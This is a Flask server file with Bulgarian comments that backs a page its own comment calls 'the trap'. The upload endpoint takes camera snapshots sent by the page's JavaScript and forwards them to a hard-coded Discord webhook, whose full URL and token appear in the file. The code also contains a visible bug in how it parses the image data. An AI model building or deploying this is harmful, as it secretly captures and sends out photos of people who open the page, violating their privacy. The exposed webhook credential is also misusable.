from flask import Flask, render_template, request, jsonify
import base64
import requests
import os

# ТУК Е "app" - ТОВА Е ОБЕКТЪТ, КОЙТО VERCEL ТЪРСИ!
app = Flask(__name__, template_folder='../templates')

# --- КОНФИГУРАЦИЯ ---
# ЗАМЕНИ ТОВА С ТВОЯ DISCORD WEBHOOK URL
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1485737648415838321/n0sOURJ6Chrtd9zbj7ViJSI_TCBWI4sMGhA-jYSP6GnnWdqbZ4NQ7LMvR84R_4LseREE"

@app.route('/')
def index():
    """Зарежда главната страница (клопката)"""
    return render_template('index.html')

@app.route('/api/upload', methods=['POST'])
def upload_image():
    """Приема снимката от JavaScript и я праща в Discord"""
    try:
        data = request.json
        if not data or 'image' not in data:
            return jsonify({"status": "error", "message": "No image data"}), 400

        # Декодиране на снимката
        image_data = data
        header, encoded = image_data.split(",", 1)
        image_bytes = base64.b64decode(encoded)

        # Пращаме към Discord
        files = {'file': ('capture.png', image_bytes, 'image/png')}
        payload = {"content": "📸 **Нова снимка от камерата!**"}
        
        requests.post(DISCORD_WEBHOOK_URL, data=payload, files=files)

        return jsonify({"status": "success"}), 200

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

# За локално тестване
if __name__ == '__main__':
    app.run(debug=True)
